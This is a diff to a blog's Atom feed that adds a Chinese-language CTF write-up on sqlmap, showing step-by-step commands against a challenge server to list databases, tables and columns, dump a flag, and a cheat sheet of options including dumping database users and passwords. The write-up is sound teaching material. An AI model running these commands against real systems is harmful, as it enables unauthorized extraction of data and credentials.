@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-05-19T11:08:56.184Z</updated>
+  <updated>2021-05-19T11:43:23.668Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://example.com/2021/05/19/%E5%85%B3%E4%BA%8ESQLmap/"/>
+    <id>http://example.com/2021/05/19/%E5%85%B3%E4%BA%8ESQLmap/</id>
+    <published>2021-05-19T11:32:22.246Z</published>
+    <updated>2021-05-19T11:43:23.668Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="关于SQLmap"><a href="#关于SQLmap" class="headerlink" title="关于SQLmap"></a>关于SQLmap</h1><p><strong>还是成绩单那个例子</strong></p><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” –dbs </p></blockquote><p>tips：因为是post方式，所以构造语句时需要加data=</p><p>– dbs 爆出数据库名称</p><p>![24](C:\Users\Pro 13\blog\themes\butterfly\source\img\24.png)</p><p>如图：可以看到全部的数据库![25](C:\Users\Pro 13\blog\themes\butterfly\source\img\25.png)</p><h2 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h2><p>将数据库中的所有表爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf –tables</p></blockquote><p>![26](C:\Users\Pro 13\blog\themes\butterfly\source\img\26.png)</p><h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>知道了数据库 知道了表 我们将表中的字段名爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g –columns</p></blockquote><p>得到：</p><p>+————+————-+<br>| Column     | Type        |<br>+————+————-+<br>| skctf_flag | varchar(64) |<br>+————+————-+</p><h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>最后一步 爆字段内容</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g -C ‘skctf_flag’ –dump</p></blockquote><p>+—————————————-+<br>| skctf_flag                             |<br>+—————————————-+<br>| flag{aaab401ce593c5d4334e8c565a91b82e} |<br>+—————————————-+</p><h2 id="小结（sqlmap基本命令）"><a href="#小结（sqlmap基本命令）" class="headerlink" title="小结（sqlmap基本命令）"></a>小结（sqlmap基本命令）</h2><ul><li><p>曝出数据库名称 <strong>–dbs</strong></p></li><li><p>查看web当前使用的数据库 <strong>–current -db</strong></p></li><li><p>曝出web数据库使用账户    <strong>–current -user</strong></p></li><li><p>列出数据库所有账户    <strong>–users</strong></p></li><li><p>曝出数据库账号和密码    <strong>–passwords</strong></p></li><li><p>列出数据库中的表  <strong>-D XX –tables</strong> </p><p>(-D：指定数据库名称 XX：数据库名称 –    tables：列出该数据库的表)</p></li><li><p>列出表中的字段 <strong>-D XX -T YY –columns</strong> </p></li></ul><p>（-D指数据库名称 XX指数据库 -T指要列出字段的表  YY指数据库中的表 –columns指字段）</p><ul><li><p>曝字段内容 <strong>-D XX -T YY -C ”a,b,c” –dump</strong> </p><p>(-D指数据库名称 XX指数据库 -T指要列出字段的表 YY指数据库中的表 -C指定要曝的字段 –dump将结果导出)</p></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;关于SQLmap&quot;&gt;&lt;a href=&quot;#关于SQLmap&quot; class=&quot;headerlink&quot; title=&quot;关于SQLmap&quot;&gt;&lt;/a&gt;关于SQLmap&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;还是成绩单那个例子&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&quot;第一步：&quot;&gt;&lt;</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title></title>
